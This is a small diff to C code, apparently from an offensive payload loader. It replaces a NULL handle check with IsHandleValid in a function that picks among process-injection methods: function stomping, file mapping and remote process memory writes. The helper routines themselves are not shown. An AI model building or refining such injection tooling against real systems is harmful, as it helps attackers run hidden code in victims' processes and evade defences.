@@ -11,7 +11,7 @@ BOOL payload_loading(PVOID *pPayloadAddress, LPVOID Payload, SIZE_T PayloadSize,
     LPWSTR processName = va_arg(args, LPWSTR);
 
 #if defined(FUNCTION_STOMPING)
-    if (hProcess != NULL) {
+    if (IsHandleValid(hProcess)) {
         DebugPrint("[i] Payload loading through Remote Function Stomping...\n");
         bSuccess = WritePayloadViaRemoteFunctionStomping(pPayloadAddress, Payload, PayloadSize);
     } else {
@@ -19,7 +19,7 @@ BOOL payload_loading(PVOID *pPayloadAddress, LPVOID Payload, SIZE_T PayloadSize,
         bSuccess = WritePayloadViaFunctionStomping(pPayloadAddress, Payload, PayloadSize);
     }
 #elif defined (FILE_MAPPING)
-    if (hProcess != NULL) {
+    if (IsHandleValid(hProcess)) {
         DebugPrint("[i] Payload loading through Remote File Mapping...\n");
         bSuccess = WritePayloadViaRemoteFileMapping(Payload, PayloadSize, pPayloadAddress);
         pPayloadAddress = *pPayloadAddress;
@@ -29,7 +29,7 @@ BOOL payload_loading(PVOID *pPayloadAddress, LPVOID Payload, SIZE_T PayloadSize,
         pPayloadAddress = *pPayloadAddress;
     }    
 #else
-    if (hProcess != NULL) {
+    if (IsHandleValid(hProcess)) {
         DebugPrint("[i] Payload loading through standard remote process in memory technique...\n");
         bSuccess = WritePayloadInRemoteProcessMemory(hProcess, Payload, PayloadSize, pPayloadAddress);
     } else {
